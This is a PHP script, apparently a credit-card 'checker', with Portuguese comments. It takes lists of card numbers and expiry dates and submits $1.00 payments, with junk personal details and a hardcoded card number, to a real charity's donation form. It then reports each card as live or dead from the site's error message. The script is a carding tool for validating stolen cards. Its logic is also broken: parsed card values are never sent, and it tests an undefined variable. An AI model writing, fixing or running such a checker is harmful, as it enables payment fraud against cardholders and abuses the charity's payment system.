<?php

include('functions/curl.php');
include('functions/getstr.php');
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    $cc = trim(explode("|", $_GET['lista'])[0]);
    $mes = trim(explode("|", $_GET['lista'])[1]);
	$ano = trim(explode("|", $_GET['lista'])[2]);
	
	$a=array("hotmail","gmail","outlook");
    $randmail=array_rand($a, 2);
	


//PRECISA CONVERTER O MES PRA NUMERO

	
    $response = curl('https://lifelinechild.org/make-a-payment/', 'input_3.3=sdcasdcsdc&input_3.6=ascdsadcasd&input_16=%241.00&input_12.1=3%25+Convenience+Fee&input_12.2=%240.03&input_12.3=1&input_8%5B%5D=Contract+Homestudy+Only&input_4.1=dsavsdfv+545454&input_4.2=sdfvsdfv54554&input_4.3=NewYork&input_4.4=NY&input_4.5=10001&input_4.6=United+States&input_5=asdcs24343%40dcbjh.com&input_17=&input_6=%28444%29+444-4444&input_7=asdcasdc&input_15=1.03&input_11.1=5522890244350312&input_11.2%5B%5D=4&input_11.2%5B%5D=2023&input_11.3=+++&input_11.5=asdc+asdads&input_18=&is_submit_175=1&gform_submit=175&gform_unique_id=&state_175=WyJ7XCIxMi4xXCI6XCI5ZjFhZTM2ZWEzZDAzZDk0NzdiOWMwMTA0MGMzZWQ5NVwiLFwiMTIuMlwiOlwiZDcyNWM5MWRhMzY3NmJiYTU2NjA2MzRhMjE5MGFiMjlcIn0iLCI0NTIxN2IyNmJhM2M5NTFiOGVmNWZjNDAzYmE5ZTIwMyJd&gform_target_page_number_175=0&gform_source_page_number_175=1&gform_field_values=&gf_zero_spam_key=6Bim29S16jgwADeSv25q8du61p24Z1yCkM94qbgeTWe9aJBi3XnUHZmN7hPkPQTb', array('Host: lifelinechild.org','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Content-Type: application/x-www-form-urlencoded','Referer: https://lifelinechild.org/make-a-payment/', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'));
    
	echo $response;
	//*************************************************************
	//Alguns que da essa msg de erro, não prestam mesmo, mas tem uns que prestam sim!, esse é um dos que prestam
	//*************************************************************
    if (!strpos($step1, 'There was an error processing your credit card. Please verify the information and try again.') !== false ) {
        echo json_encode(array("status" => 0, "msg" => "$cc $mes $ano"));
    } else {
        echo json_encode(array("status" => 1, "msg" => "$cc $mes $ano"));
    }
} else {
    echo "Error";
}